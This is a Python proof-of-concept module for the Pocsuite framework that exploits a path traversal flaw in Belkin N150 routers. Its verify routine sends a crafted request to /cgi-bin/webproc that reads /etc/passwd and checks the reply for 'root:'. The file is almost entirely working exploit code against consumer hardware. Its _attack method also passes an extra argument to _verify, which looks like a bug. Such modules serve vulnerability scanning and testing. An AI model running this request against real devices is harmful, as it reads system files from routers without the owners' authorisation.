#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Belkin N150 Path Traversal"
    vulID = ''
    author = ['sebao']
    vulType = 'Path Traversal'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/38488/'
    desc = 'Module exploits Belkin N150 Path Traversal vulnerability which allows to read any file on the system.'


    vulDate = ''
    createDate = '2017-10-13'
    updateDate = '2017-10-13'

    appName = 'belkin'
    appVersion = 'Belkin N150 1.00.07,N150 1.00.08,N150 1.00.09'

    dork = ''
    appPowerLink = 'http://www.belkin.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo'
        resp = req.get(url)

        if resp.status_code == 200 and "root:" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
